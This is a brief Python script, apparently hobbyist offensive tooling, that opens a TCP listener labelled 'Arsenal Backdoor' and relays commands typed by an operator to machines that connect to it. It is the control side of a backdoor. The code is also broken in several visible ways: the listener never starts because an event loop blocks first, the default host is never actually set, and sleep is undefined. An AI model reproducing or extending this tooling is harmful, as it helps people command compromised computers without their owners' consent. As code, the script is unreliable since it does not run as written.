#!/usr/bin/python3
import socket, sys, os, argparse, asyncio
from _thread import start_new_thread
parser = argparse.ArgumentParser(description='q*bert says goodbye')
parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
parser.add_argument('-s', dest='host', help='Hosting IP')
args = parser.parse_args()

menu = {'0': 'Arsenal Backdoor', '9999': 'Arsenal backdoor'}
try:
    args.host
except NameError:
    args.host = '0.0.0.0'

def client(conn, addr, buff):
    conn.send(b'Arsenal Backdoor\n')
    while True:
        data = conn.recv(buff)
        print(addr[0]+':\n\r', str(data.strip(), 'utf-8'))
        reply=input('Enter command for %s: ' %addr[0])
        if not data:
            break
        conn.send(bytes(reply, 'utf-8'))
        print(reply)
    conn.close()
    print("\nClosed connection from %s:%s" %(addr[0],addr[1]))

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096 
    s.bind((args.host, args.port))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        print("Connection received from %s:%s" %(addr[0], addr[1]))
        try:
            start_new_thread(client, (conn, addr, buff))
        except socket.error:
            sys.stderr.write("[Error] %s\n" %socket.error.msg[1])
        except KeyboardInterrupt:
            print('[-] Server shutting down...')
            break

async def draw_screen():
    global menu
    os.system('clear')
    while True:
        print(menu)
        sleep(0.1)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_forever()
    main()
